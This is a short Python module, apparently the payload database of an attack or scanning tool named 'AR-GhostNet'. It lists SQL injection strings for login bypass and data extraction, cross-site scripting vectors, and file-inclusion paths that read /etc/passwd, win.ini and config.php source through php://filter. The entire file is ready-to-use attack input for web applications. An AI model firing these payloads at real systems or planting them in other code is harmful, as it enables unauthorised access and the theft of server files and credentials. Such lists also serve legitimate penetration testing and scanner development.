# AR-GhostNet | Payload Database
# Location: utils/payloads.py

class Payloads:
    # --- SQL Injection Payloads (Auth Bypass & Data Extraction) ---
    SQLI = [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL, NULL--",
        "1' ORDER BY 1--",
        "1' OR 1=1 LIMIT 1--",
        "admin' AND 1=1--",
        "' OR 1=1 #"
    ]

    # --- XSS Payloads (Cross-Site Scripting) ---
    XSS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>"
    ]

    # --- LFI/RFI Payloads (Local/Remote File Inclusion) ---
    LFI = [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=config.php"
    ]